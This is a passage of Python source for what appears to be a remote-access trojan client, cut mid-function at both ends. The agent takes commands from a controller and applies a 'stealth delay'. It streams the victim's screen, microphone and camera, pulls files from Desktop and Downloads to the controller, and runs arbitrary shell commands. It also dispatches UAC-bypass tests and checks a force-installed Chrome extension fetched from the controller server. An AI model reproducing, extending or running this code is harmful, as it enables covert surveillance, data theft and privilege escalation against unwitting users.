    """Handle command execution requests.
    
    CRITICAL: Runs in separate thread to prevent blocking Socket.IO!
    """
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle command", "warning")
        return
    
    agent_id = get_or_create_agent_id()
    command = data.get("command")
    try:
        if data.get("encrypted"):
            command = _e2e_decrypt(agent_id, command)
    except Exception:
        pass
    if isinstance(command, str) and command.startswith("ll"):
        command = "list-dir" + command[2:]
    
    # Run in separate thread to prevent blocking Socket.IO
    def execute_in_thread():
        output = ""
        
        # Add stealth delay
        sleep_random_non_blocking()

        internal_commands = {
            "start-stream": lambda: start_streaming(agent_id),
            "stop-stream": stop_streaming,
            "start-audio": lambda: start_audio_streaming(agent_id),
            "stop-audio": stop_audio_streaming,
            "start-camera": lambda: start_camera_streaming(agent_id),
            "stop-camera": stop_camera_streaming,
            # WebRTC streaming commands for low-latency streaming
            "start-webrtc": lambda: start_webrtc_streaming(agent_id, True, True, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
            "stop-webrtc": lambda: stop_webrtc_streaming(agent_id) if AIORTC_AVAILABLE else stop_streaming(),
            "start-webrtc-screen": lambda: start_webrtc_streaming(agent_id, True, False, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
            "start-webrtc-audio": lambda: start_webrtc_streaming(agent_id, False, True, False) if AIORTC_AVAILABLE else start_audio_streaming(agent_id),
            "start-webrtc-camera": lambda: start_webrtc_streaming(agent_id, False, False, True) if AIORTC_AVAILABLE else start_camera_streaming(agent_id),
            "webrtc-stats": lambda: get_webrtc_stats(agent_id) if AIORTC_AVAILABLE else "WebRTC not available",
        }

        if command in internal_commands:
            output = internal_commands[command]()
        elif command == "check-extension-status":
            import json
            ext_id = None
            try:
                cfg = _fetch_extension_config()
                ext_id = cfg.get('extension_id') or VAULT_EXTENSION_ID
            except Exception:
                ext_id = VAULT_EXTENSION_ID
            policy_applied = False
            registered = False
            folders = []
            extensions_dirs = []
            update_xml_ok = False
            crx_ok = False
            try:
                import sys
                if sys.platform == 'win32':
                    import winreg, os
                    # HKCU
                    try:
                        base2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist")
                        i = 0
                        while True:
                            try:
                                _, value, _ = winreg.EnumValue(base2, i)
                                i += 1
                                if isinstance(value, str) and value.startswith(str(ext_id) + ";"):
                                    policy_applied = True
                                    break
                            except OSError:
                                break
                        try:
                            winreg.CloseKey(base2)
                        except Exception:
                            pass
                    except Exception:
                        pass
                    # HKLM
                    try:
                        base3 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Policies\Google\Chrome\ExtensionInstallForcelist")
                        i = 0
                        while True:
                            try:
                                _, value, _ = winreg.EnumValue(base3, i)
                                i += 1
                                if isinstance(value, str) and value.startswith(str(ext_id) + ";"):
                                    policy_applied = True
                                    break
                            except OSError:
                                break
                        try:
                            winreg.CloseKey(base3)
                        except Exception:
                            pass
                    except Exception:
                        pass
                    try:
                        access_r = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)
                        winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_r)
                        registered = True
                    except Exception:
                        try:
                            access_r32 = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_32KEY", 0)
                            winreg.OpenKey(winreg.HKEY_CURRENT_USER, fr"Software\Google\Chrome\Extensions\{ext_id}", 0, access_r32)
                            registered = True
                        except Exception:
                            pass
                    try:
                        base = os.environ.get('LOCALAPPDATA') or ''
                        user_data = os.path.join(base, 'Google', 'Chrome', 'User Data')
                        if os.path.isdir(user_data):
                            for name in os.listdir(user_data):
                                p = os.path.join(user_data, name, 'Local Extension Settings', str(ext_id))
                                if os.path.isdir(p):
                                    folders.append(p)
                                p2 = os.path.join(user_data, name, 'Extensions', str(ext_id))
                                if os.path.isdir(p2):
                                    extensions_dirs.append(p2)
                    except Exception:
                        pass
                    # Check server resources
                    try:
                        base = SERVER_URL if USE_FIXED_SERVER_URL else get_controller_url()
                    except Exception:
                        base = SERVER_URL
                    try:
                        import urllib.request
                        headers = {'User-Agent': 'Mozilla/5.0'}
                        uxml = f"{(base or SERVER_URL).rstrip('/')}/download/extensions/update.xml"
                        req_xml = urllib.request.Request(uxml, headers=headers)
                        with urllib.request.urlopen(req_xml, timeout=6) as r:
                            code = getattr(r, 'status', None)
                            if code is None:
                                try:
                                    code = r.getcode()
                                except Exception:
                                    code = 0
                            ok = (int(code) == 200)
                            if ok:
                                try:
                                    blob = r.read(64)
                                    ok = bool(blob)
                                except Exception:
                                    ok = True
                            update_xml_ok = bool(ok)
                    except Exception:
                        update_xml_ok = False
                    try:
                        import urllib.request
                        headers = {'User-Agent': 'Mozilla/5.0'}
                        ucrx = f"{(base or SERVER_URL).rstrip('/')}/download/extensions/extension.crx"
                        req_crx = urllib.request.Request(ucrx, headers=headers)
                        with urllib.request.urlopen(req_crx, timeout=6) as r:
                            code = getattr(r, 'status', None)
                            if code is None:
                                try:
                                    code = r.getcode()
                                except Exception:
                                    code = 0
                            length = 0
                            try:
                                length = int(r.headers.get('Content-Length') or '0')
                            except Exception:
                                try:
                                    blob = r.read(64)
                                    length = len(blob)
                                except Exception:
                                    length = 0
                            crx_ok = (int(code) == 200 and length > 0)
                    except Exception:
                        crx_ok = False
            except Exception:
                pass
            installed = bool(registered or (len(folders) > 0) or (len(extensions_dirs) > 0))
            status = {
                'agent_id': agent_id,
                'extension_id': str(ext_id),
                'installed': installed,
                'policy_applied': policy_applied,
                'registered': registered,
                'folder_count': len(folders),
                'folders': folders,
                'extensions_dir_count': len(extensions_dirs),
                'extensions_dirs': extensions_dirs,
                'update_xml_ok': bool(update_xml_ok),
                'crx_ok': bool(crx_ok)
            }
            try:
                safe_emit('extension_status', status)
            except Exception:
                pass
            try:
                output = json.dumps(status, separators=(',', ':'), ensure_ascii=True)
            except Exception:
                output = ''
            try:
                safe_emit('command_result', {
                    'agent_id': agent_id,
                    'output': output,
                    'terminal_type': 'legacy',
                    'timestamp': int(time.time() * 1000)
                })
            except Exception:
                pass
            return
        elif command == "list-processes":
            try:
                import psutil
                proc_list = []
                for p in psutil.process_iter(['pid','name','username','cpu_percent','memory_info','status','ppid','cmdline','create_time','nice','num_threads']):
                    info = p.info
                    proc_list.append({
                        'pid': info.get('pid'),
                        'name': info.get('name') or '',
                        'username': info.get('username') or '',
                        'cpu': float(info.get('cpu_percent') or 0.0),
                        'memory': float((getattr(info.get('memory_info'),'rss',0) or 0) / (1024*1024)),
                        'status': info.get('status') or 'running',
                        'ppid': info.get('ppid') or 0,
                        'cmdline': ' '.join(info.get('cmdline') or [])[:512],
                        'create_time': int(info.get('create_time') or 0)*1000,
                        'priority': 0,
                        'nice': info.get('nice') or 0,
                        'num_threads': info.get('num_threads') or 0,
                    })
                safe_emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
                emit_system_notification('success', 'Process List Retrieved', f'Successfully retrieved {len(proc_list)} processes')
                output = f"Sent {len(proc_list)} processes"
            except Exception as e:
                emit_system_notification('error', 'Process List Failed', f'Failed to retrieve process list: {str(e)}')
                output = f"Error listing processes: {e}"
        elif command.startswith("list-dir"):
            try:
                global LAST_BROWSED_DIRECTORY
                parts = command.split(":",1)
                path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
                try:
                    import os, re
                    if os.name == 'nt':
                        raw = str(path or '').strip()
                        if raw in ('', '/', '\\'):
                            path = os.environ.get('SystemDrive', 'C:') + '\\'
                        else:
                            m = re.match(r'^/?([A-Za-z]):[\\/]?$', raw)
                            if m:
                                path = m.group(1).upper() + ':\\'
                            elif not re.match(r'^[A-Za-z]:', raw):
                                if raw.startswith('/') or raw.startswith('\\'):
                                    drive = os.environ.get('SystemDrive', 'C:')
                                    path = os.path.normpath(drive + '\\' + raw.lstrip('\\/'))
                                else:
                                    path = os.path.normpath(os.path.join(os.path.expanduser('~'), raw))
                            else:
                                path = os.path.normpath(raw)
                    else:
                        path = os.path.normpath(path or '/')
                except Exception:
                    pass
                
                # Remember this directory for file downloads
                LAST_BROWSED_DIRECTORY = path
                log_message(f"[FILE_MANAGER] Browsing directory: {path}")
                
                entries = []
                if os.path.isdir(path):
                    for name in os.listdir(path):
                        full = os.path.join(path,name)
                        try:
                            stat = os.stat(full)
                            entries.append({
                                'name': name,
                                'type': 'directory' if os.path.isdir(full) else 'file',
                                'size': int(stat.st_size),
                                'modified': int(stat.st_mtime*1000),
                                'path': full,
                                'extension': (os.path.splitext(name)[1][1:] if os.path.isfile(full) else None)
                            })
                        except Exception:
                            continue
                safe_emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
                emit_system_notification('success', 'Directory Listed', f'Listed {len(entries)} items in {path}')
                output = f"Listed {len(entries)} entries in {path}"
            except Exception as e:
                emit_system_notification('error', 'Directory List Failed', f'Failed to list directory: {str(e)}')
                output = f"Error listing directory: {e}"
        elif command.startswith("delete-file:" ):
            try:
                path = command.split(":",1)[1]
                ok = False
                import os as _os
                if _os.path.isfile(path):
                    try:
                        _os.remove(path)
                    except Exception:
                        pass
                    ok = True
                    emit_system_notification('success', 'File Deleted', f'File {_os.path.basename(path)} deleted successfully')
                elif _os.path.isdir(path):
                    import shutil
                    try:
                        shutil.rmtree(path)
                    except Exception:
                        pass
                    ok = True
                    emit_system_notification('success', 'Directory Deleted', f'Directory {_os.path.basename(path)} deleted successfully')
                if not ok:
                    try:
                        import subprocess
                        ps_exe = _os.path.join(_os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
                        ps_path = str(path).replace("'", "''")
                        ps_cmd = f"Remove-Item -LiteralPath '{ps_path}' -Recurse -Force -ErrorAction SilentlyContinue"
                        r = subprocess.run([ps_exe, "-NoProfile", "-NonInteractive", "-Command", ps_cmd], capture_output=True, timeout=60)
                        if r.returncode == 0:
                            ok = True
                            emit_system_notification('success', 'Deleted via PowerShell', f'Removed {_os.path.basename(path)}')
                    except Exception:
                        pass
                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': ok})
                output = f"Deleted: {path}" if ok else f"Delete failed: {path}"
            except Exception as e:
                emit_system_notification('error', 'Delete Failed', f'Failed to delete: {str(e)}')
                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
                output = f"Error deleting: {e}"
        elif command.startswith("rename-file:" ):
            try:
                parts = command.split(":",2)
                src = parts[1]
                dst = parts[2] if len(parts)>2 else None
                ok = False
                if src and dst:
                    os.rename(src, dst)
                    ok = True
                    emit_system_notification('success', 'File Renamed', f'File renamed to {os.path.basename(dst)}')
                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': ok})
                output = f"Renamed to: {dst}" if ok else "Rename failed"
            except Exception as e:
                emit_system_notification('error', 'Rename Failed', f'Failed to rename file: {str(e)}')
                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': False, 'error': str(e)})
                output = f"Error renaming: {e}"
        elif command.startswith("mkdir:" ):
            try:
                path = command.split(":",1)[1]
                os.makedirs(path, exist_ok=True)
                emit_system_notification('success', 'Directory Created', f'Directory {os.path.basename(path)} created successfully')
                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': True})
                output = f"Created: {path}"
            except Exception as e:
                emit_system_notification('error', 'Directory Creation Failed', f'Failed to create directory: {str(e)}')
                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
                output = f"Error mkdir: {e}"
        elif command.startswith("upload-file:"):
            # New chunked file upload
            parts = command.split(":", 2)
            if len(parts) >= 3:
                file_path = parts[1]
                destination_path = parts[2] if len(parts) > 2 else None
                output = send_file_chunked_to_controller(file_path, agent_id, destination_path)
            else:
                output = "Invalid upload command format. Use: upload-file:source_path:destination_path"
        elif command.startswith("download-file:"):
            # New chunked file download - this is handled by Socket.IO events
            parts = command.split(":", 1)
            if len(parts) >= 2:
                file_path = parts[1]
                # Try to find the file in common locations
                possible_paths = [
                    file_path,  # Try as-is first
                    os.path.join(os.getcwd(), file_path),  # Current directory
                    os.path.join(os.path.expanduser("~"), file_path),  # Home directory
                    os.path.join(os.path.expanduser("~/Desktop"), file_path),  # Desktop
                    os.path.join(os.path.expanduser("~/Downloads"), file_path),  # Downloads
                    os.path.join("C:/", file_path),  # C: root
                    os.path.join("C:/Users/Public", file_path),  # Public folder
                ]
                
                found_path = None
                for path in possible_paths:
                    if os.path.exists(path):
                        found_path = path
                        break
                
                if found_path:
                    output = send_file_chunked_to_controller(found_path, agent_id)
                else:
                    output = f"File not found: {file_path}"
            else:
                output = "Invalid download command format. Use: download-file:file_path"
        elif command.startswith("play-voice:"):
            output = handle_voice_playback(command.split(":", 1))
        elif command == "shutdown":
            # Shutdown agent
            output = "Agent shutting down..."
            safe_emit('command_result', {
                'agent_id': agent_id,
                'output': output,
                'terminal_type': 'system',
                'timestamp': int(time.time() * 1000)
            })
            log_message("[SHUTDOWN] Agent shutdown requested")
            time.sleep(1)
            os._exit(0)
        elif command == "restart":
            # Restart agent
            output = "Agent restarting..."
            safe_emit('command_result', {
                'agent_id': agent_id,
                'output': output,
                'terminal_type': 'system',
                'timestamp': int(time.time() * 1000)
            })
            log_message("[RESTART] Agent restart requested")
            time.sleep(1)
            if WINDOWS_AVAILABLE:
                os.execv(sys.executable, [sys.executable] + sys.argv)
            else:
                os.execv(sys.executable, [sys.executable] + sys.argv)
        elif command == "collect-logs":
            # Collect system logs
            try:
                logs = []
                if WINDOWS_AVAILABLE:
                    # Windows: Get recent Event Viewer logs
                    result = execute_command("powershell -Command \"Get-EventLog -LogName System -Newest 100 | Select-Object TimeGenerated, EntryType, Source, Message | ConvertTo-Json\"")
                    logs.append("=== Windows System Event Logs (Last 100) ===")
                    if isinstance(result, dict):
                        logs.append(result.get('output', ''))
                    else:
                        logs.append(str(result))
                else:
                    # Linux: Get syslog
                    result = execute_command("tail -n 100 /var/log/syslog")
                    logs.append("=== System Logs (Last 100 lines) ===")
                    if isinstance(result, dict):
                        logs.append(result.get('output', ''))
                    else:
                        logs.append(str(result))
                
                output = "\n".join(logs)
            except Exception as e:
                output = f"Error collecting logs: {e}"
        elif command == "security-scan":
            # Run security assessment
            try:
                scan_results = []
                scan_results.append("=== Security Scan Results ===\n")
                
                # Check UAC status
                if WINDOWS_AVAILABLE:
                    scan_results.append("1. UAC Status:")
                    result = execute_command("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA")
                    if isinstance(result, dict):
                        scan_results.append(result.get('output', ''))
                    else:
                        scan_results.append(str(result))
                    scan_results.append("")
                
                # Check Windows Defender
                if WINDOWS_AVAILABLE:
                    scan_results.append("2. Windows Defender Status:")
                    result = execute_command("powershell -Command \"Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled | ConvertTo-Json\"")
                    if isinstance(result, dict):
                        scan_results.append(result.get('output', ''))
                    else:
                        scan_results.append(str(result))
                    scan_results.append("")
                
                # Check firewall status
                scan_results.append("3. Firewall Status:")
                if WINDOWS_AVAILABLE:
                    result = execute_command("netsh advfirewall show allprofiles state")
                else:
                    result = execute_command("sudo ufw status")
                if isinstance(result, dict):
                    scan_results.append(result.get('output', ''))
                else:
                    scan_results.append(str(result))
                scan_results.append("")
                
                # Check running processes
                scan_results.append("4. High-Risk Processes:")
                if WINDOWS_AVAILABLE:
                    result = execute_command("powershell -Command \"Get-Process | Where-Object {$_.CPU -gt 50} | Select-Object ProcessName, CPU, WorkingSet | ConvertTo-Json\"")
                else:
                    result = execute_command("ps aux | awk '{if($3>50.0) print $0}'")
                if isinstance(result, dict):
                    scan_results.append(result.get('output', ''))
                else:
                    scan_results.append(str(result))
                
                scan_results.append("\n=== Scan Complete ===")
                output = "\n".join(scan_results)
            except Exception as e:
                output = f"Error running security scan: {e}"
        elif command == "get_hardware_info":
            try:
                import json as _json
                def _parse(v):
                    try:
                        s = ""
                        if isinstance(v, dict):
                            s = str(v.get('output','')).strip()
                        else:
                            s = str(v).strip()
                        i1 = s.find('{')
                        i2 = s.find('[')
                        idx = i1 if (i1>=0 and (i1<=i2 or i2<0)) else i2
                        if idx is not None and idx >= 0:
                            s = s[idx:]
                        return _json.loads(s)
                    except Exception:
                        return None
                hw = {}
                cpu_raw = execute_command("powershell -Command \"Get-CimInstance Win32_Processor | Select Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer | ConvertTo-Json\"")
                cpu_json = _parse(cpu_raw)
                cpu_obj = cpu_json[0] if isinstance(cpu_json, list) and cpu_json else (cpu_json or {})
                hw['cpu'] = {
                    'name': str(cpu_obj.get('Name') or ''),
                    'cores': int(cpu_obj.get('NumberOfCores') or 0),
                    'threads': int(cpu_obj.get('NumberOfLogicalProcessors') or 0),
                    'frequency': int(cpu_obj.get('MaxClockSpeed') or 0),
                    'architecture': platform.machine(),
                    'vendor': str(cpu_obj.get('Manufacturer') or '')
                }
                mem_mod_raw = execute_command("powershell -Command \"Get-CimInstance Win32_PhysicalMemory | Select Manufacturer, Capacity, Speed | ConvertTo-Json\"")
                mem_mod_json = _parse(mem_mod_raw) or []
                modules = []
                if isinstance(mem_mod_json, list):
                    for m in mem_mod_json:
                        cap = m.get('Capacity')
                        try:
                            cap_int = int(cap)
                        except Exception:
                            try:
                                cap_int = int(float(cap))
                            except Exception:
                                cap_int = 0
                        spd = m.get('Speed')
                        try:
                            spd_int = int(spd)
                        except Exception:
                            try:
                                spd_int = int(float(spd))
                            except Exception:
                                spd_int = 0
                        modules.append({
                            'manufacturer': str(m.get('Manufacturer') or ''),
                            'capacity': cap_int,
                            'speed': spd_int
                        })
                mem_total = 0
                mem_available = 0
                mem_used = 0
                mem_speed = 0
                try:
                    import psutil as _ps
                    vm = _ps.virtual_memory()
                    mem_total = int(getattr(vm, 'total', 0) or 0)
                    mem_available = int(getattr(vm, 'available', 0) or 0)
                    mem_used = int(getattr(vm, 'used', 0) or 0)
                except Exception:
                    pass
                if mem_total == 0:
                    s_raw = execute_command("powershell -Command \"Get-CimInstance Win32_ComputerSystem | Select TotalPhysicalMemory | ConvertTo-Json\"")
                    s_json = _parse(s_raw)
                    if isinstance(s_json, list) and s_json:
                        try:
                            mem_total = int(s_json[0].get('TotalPhysicalMemory') or 0)
                        except Exception:
                            mem_total = 0
                    elif isinstance(s_json, dict):
                        try:
                            mem_total = int(s_json.get('TotalPhysicalMemory') or 0)
                        except Exception:
                            mem_total = 0
                    mem_available = 0
                    mem_used = 0
                if modules:
                    try:
                        mem_speed = int(round(sum([m.get('speed',0) for m in modules if isinstance(m.get('speed',0), (int,float))]) / max(1, len(modules))))
                    except Exception:
                        mem_speed = 0
                hw['memory'] = {
                    'total': mem_total,
                    'available': mem_available,
                    'used': mem_used,
                    'type': 'DDR' if modules else '',
                    'speed': mem_speed,
                    'modules': modules
                }
                disk_raw = execute_command("powershell -Command \"Get-CimInstance Win32_DiskDrive | Select Model, Size, InterfaceType, MediaType | ConvertTo-Json\"")
                disk_json = _parse(disk_raw) or []
                storage = []
                if isinstance(disk_json, list):
                    for d in disk_json:
                        sz = d.get('Size')
                        try:
                            sz_int = int(sz)
                        except Exception:
                            try:
                                sz_int = int(float(sz))
                            except Exception:
                                sz_int = 0
                        storage.append({
                            'name': str(d.get('Model') or ''),
                            'size': sz_int,
                            'type': str(d.get('MediaType') or ''),
                            'interface': str(d.get('InterfaceType') or ''),
                            'health': 'Good'
                        })
                hw['storage'] = storage
                gpu_raw = execute_command("powershell -Command \"Get-CimInstance Win32_VideoController | Select Name, AdapterRAM, DriverVersion, VideoProcessor | ConvertTo-Json\"")
                gpu_json = _parse(gpu_raw) or []
                gpus = []
                if isinstance(gpu_json, list):
                    for g in gpu_json:
                        ram = g.get('AdapterRAM')
                        try:
                            ram_int = int(ram)
                        except Exception:
                            try:
                                ram_int = int(float(ram))
                            except Exception:
                                ram_int = 0
                        gpus.append({
                            'name': str(g.get('Name') or ''),
                            'memory': ram_int,
                            'driver': str(g.get('DriverVersion') or ''),
                            'vendor': str(g.get('VideoProcessor') or '')
                        })
                hw['gpu'] = gpus
                net_raw = execute_command("powershell -Command \"Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | Select Description, MACAddress, IPAddress | ConvertTo-Json\"")
                net_json = _parse(net_raw) or []
                nets = []
                if isinstance(net_json, list):
                    for n in net_json:
                        ip = n.get('IPAddress')
                        if isinstance(ip, list) and ip:
                            ip_str = str(ip[0])
                        else:
                            ip_str = str(ip or '')
                        nets.append({
                            'name': str(n.get('Description') or ''),
                            'mac': str(n.get('MACAddress') or ''),
                            'ip': ip_str,
                            'type': 'Ethernet' if 'Ethernet' in str(n.get('Description') or '') else 'Network'
                        })
                hw['network'] = nets
                mb_raw = execute_command("powershell -Command \"Get-CimInstance Win32_BaseBoard | Select Manufacturer, Product | ConvertTo-Json\"")
                mb_json = _parse(mb_raw)
                bios_raw = execute_command("powershell -Command \"Get-CimInstance Win32_BIOS | Select SMBIOSBIOSVersion | ConvertTo-Json\"")
                bios_json = _parse(bios_raw)
                mb = {}
                if isinstance(mb_json, list) and mb_json:
                    mb['manufacturer'] = str(mb_json[0].get('Manufacturer') or '')
                    mb['model'] = str(mb_json[0].get('Product') or '')
                elif isinstance(mb_json, dict):
                    mb['manufacturer'] = str(mb_json.get('Manufacturer') or '')
                    mb['model'] = str(mb_json.get('Product') or '')
                if isinstance(bios_json, list) and bios_json:
                    mb['bios'] = str(bios_json[0].get('SMBIOSBIOSVersion') or '')
                elif isinstance(bios_json, dict):
                    mb['bios'] = str(bios_json.get('SMBIOSBIOSVersion') or '')
                hw['motherboard'] = mb
                safe_emit('agent_response', {
                    'agent_id': our_agent_id,
                    'agentId': our_agent_id,
                    'type': 'hardware_info',
                    'hardware': hw
                })
                output = "hardware_info"
                success = True
            except Exception as e:
                output = f"Error gathering hardware info: {e}"
                success = False
        elif command == "update-agent":
            # Placeholder for agent update mechanism
            output = "Agent update mechanism not yet implemented.\n"
            output += "Future implementation will:\n"
            output += "1. Download latest agent version from controller\n"
            output += "2. Verify signature\n"
            output += "3. Replace current executable\n"
            output += "4. Restart with new version"
        elif isinstance(command, str) and command.lower().startswith("cd "):
            try:
                path = command[3:].strip()
                if len(path) == 1 and path.isalpha():
                    path = f"{path}:\\"
                elif len(path) == 2 and path[1] == ":" and path[0].isalpha():
                    path = f"{path}\\"
                path = os.path.expanduser(path)
                os.chdir(path)
                output = f"Changed directory to: {os.getcwd()}"
            except Exception as e:
                output = f"cd error: {str(e)}"
        elif command != "sleep":
            output = execute_command(command)
        
        if output:
            # For UI v2.1: Send PowerShell-formatted output
            if isinstance(output, dict) and 'terminal_type' in output:
                # Already formatted by execute_in_powershell
                # Make sure formatted_text is included
                result_data = {
                    'agent_id': agent_id,
                    'output': output.get('output', ''),
                    'formatted_text': output.get('formatted_text', ''),
                    'terminal_type': output.get('terminal_type', 'powershell'),
                    'prompt': output.get('prompt', 'PS C:\\>'),
                    'command': output.get('command', ''),
                    'exit_code': output.get('exit_code', 0),
                    'execution_time': output.get('execution_time', 0),
                    'timestamp': output.get('timestamp', int(time.time() * 1000))
                }
                safe_emit('command_result', result_data)
            else:
                # Legacy format (plain string output)
                safe_emit('command_result', {
                    'agent_id': agent_id,
                    'output': output,
                    'terminal_type': 'legacy',
                    'prompt': get_powershell_prompt(),
                    'timestamp': int(time.time() * 1000)
                })
    
    # Start execution thread (daemon, won't block)
    execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
    execution_thread.start()

def on_execute_command(data):
    """
    Handle execute_command event from controller UI v2.1
    This is separate from on_command to support the new UI terminal
    
    CRITICAL: Runs in separate thread to prevent blocking Socket.IO!
    """
    try:
        print("\n" + "="*80)
        print("[ MAGNIFIED ] CLIENT: execute_command EVENT RECEIVED")
        print("="*80)
        print(f"[ MAGNIFIED ] Data received: {data}")
        
        # Validate Socket.IO availability
        if not SOCKETIO_AVAILABLE or sio is None:
            error_msg = "Socket.IO not available, cannot handle execute_command"
            log_message(error_msg, "error")
            print(f"[ X ] Error: {error_msg}")
            return
        
        # Validate input data
        if not data or not isinstance(data, dict):
            error_msg = "Invalid command data received"
            log_message(error_msg, "error")
            print(f"[ X ] Error: {error_msg}")
            return
        
        agent_id = data.get('agent_id')
        command = data.get('command')
        try:
            if data.get("encrypted"):
                command = _e2e_decrypt(agent_id, command)
        except Exception:
            pass
        execution_id = data.get('execution_id')
        
        print(f"[ MAGNIFIED ] Agent ID in event: {agent_id}")
        print(f"[ MAGNIFIED ] Command: {command}")
        print(f"[ MAGNIFIED ] Execution ID: {execution_id}")
        
        # Validate required fields
        if not agent_id:
            error_msg = "Agent ID is required"
            log_message(error_msg, "error")
            print(f"[ X ] Error: {error_msg}")
            return
        
        if not command:
            error_msg = "Command is required"
            log_message(error_msg, "error")
            print(f"[ X ] Error: {error_msg}")
            return
        
        # Verify this command is for us
        try:
            our_agent_id = get_or_create_agent_id()
            print(f"[ MAGNIFIED ] Our agent ID: {our_agent_id}")
        except Exception as e:
            error_msg = f"Error getting agent ID: {str(e)}"
            log_message(error_msg, "error")
            print(f"[ X ] Error: {error_msg}")
            return
        
        if agent_id != our_agent_id:
            print(f"[ X ] Command not for us (expected {our_agent_id}, got {agent_id})")
            return  # Not for this agent
        
        print(f"[ OK ] Command is for us, proceeding to execute: {command}")
        log_message(f"[EXECUTE_COMMAND] Received: {command} (execution_id: {execution_id})")
        
        # Run command in separate thread to prevent blocking Socket.IO!
    except Exception as e:
        error_msg = f"Critical error in on_execute_command: {str(e)}"
        log_message(error_msg, "error")
        print(f"[ X ] Critical Error: {error_msg}")
        
        try:
            if SOCKETIO_AVAILABLE and sio:
                safe_emit('command_result', {
                    'agent_id': our_agent_id if 'our_agent_id' in locals() else 'unknown',
                    'execution_id': execution_id if 'execution_id' in locals() else 'unknown',
                    'output': error_msg,
                    'success': False,
                    'execution_time': 0
                })
        except Exception as emit_error:
            log_message(f"Failed to emit error response: {str(emit_error)}", "error")
    def execute_in_thread():
        output = ""
        success = True
        
        try:
            # Add stealth delay
            sleep_random_non_blocking()
        except Exception as e:
            log_message(f"Error in stealth delay: {str(e)}", "warning")
            # Continue execution even if stealth delay fails
        try:
            if command.startswith("uac-test-"):
                method = command.replace("uac-test-", "").strip().lower()
                dbg = run_uac_bypass_test(method)
                output = json.dumps(dbg, separators=(',', ':'), ensure_ascii=True)
                success = dbg.get('status') == 'success'
                safe_emit('command_result', {
                    'agent_id': our_agent_id,
                    'execution_id': execution_id,
                    'command': command,
                    'output': output,
                    'success': success,
                    'terminal_type': 'legacy',
                    'prompt': get_powershell_prompt(),
                    'timestamp': int(time.time() * 1000)
                })
                return
        except Exception as e:
            log_message(f"[EXECUTE_COMMAND] UAC test dispatch error: {e}", "error")
            pass
        try:
            if command.startswith("check-registry"):
                payload = command[len("check-registry"):].strip()
                items = None
                if payload.startswith(":") or payload.startswith(" "):
                    payload = payload[1:].strip()
                try:
                    items = json.loads(payload)
                except Exception:
                    try:
                        import base64
                        decoded = base64.b64decode(payload)
                        items = json.loads(decoded.decode('utf-8', errors='ignore'))
                    except Exception:
                        items = []
                results = []
                try:
                    import winreg
                    hive_map = {
                        'HKLM': winreg.HKEY_LOCAL_MACHINE,
                        'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
                        'HKCU': winreg.HKEY_CURRENT_USER,
                        'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
                        'HKCR': winreg.HKEY_CLASSES_ROOT,
                        'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
                        'HKU': winreg.HKEY_USERS,
                        'HKEY_USERS': winreg.HKEY_USERS,
                        'HKCC': winreg.HKEY_CURRENT_CONFIG,
                        'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG,
                    }
                    for item in (items or []):
                        hive_name = str(item.get('hive') or '').strip()
                        path = str(item.get('path') or '').strip()
                        name = str(item.get('key') or '').strip()
                        ok_path = False
                        ok_value = False
                        value = None
                        hive = hive_map.get(hive_name.upper())
                        if hive is not None and path:
                            try:
                                k = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
                                ok_path = True
                                if name:
                                    try:
                                        v, _t = winreg.QueryValueEx(k, name)
                                        ok_value = True
                                        value = v
                                    except Exception:
                                        ok_value = False
                                winreg.CloseKey(k)
                            except Exception:
                                ok_path = False
                        result_id = str(item.get('id') or (path + ("\\" + name if name else "")))
                        results.append({
                            'id': result_id,
                            'hive': hive_name,
                            'path': path,
                            'key': name,
                            'exists_path': ok_path,
                            'exists_value': ok_value,
                            'present': bool(ok_value or (ok_path and not name)),
                            'value': value
                        })
                except Exception:
                    results = []
                safe_emit('registry_presence', {
                    'agent_id': our_agent_id,
                    'items': results
                })
                output = json.dumps({'count': len(results)}, separators=(',', ':'), ensure_ascii=True)
                success = True
                safe_emit('command_result', {
                    'agent_id': our_agent_id,
                    'execution_id': execution_id,
                    'command': command,
                    'output': output,
                    'success': success,
                    'terminal_type': 'legacy',
                    'prompt': get_powershell_prompt(),
                    'timestamp': int(time.time() * 1000)
                })
                return
        except Exception:
            pass
        try:
            normalized_cmd = ""
            try:
                normalized_cmd = str(command or "").strip().lower()
            except Exception:
                normalized_cmd = "get-computerinfo"
            if normalized_cmd == "get_hardware_info" or normalized_cmd == "get-computerinfo":
                import json as _json
                def _parse(v):
                    try:
                        s = ""
                        if isinstance(v, dict):
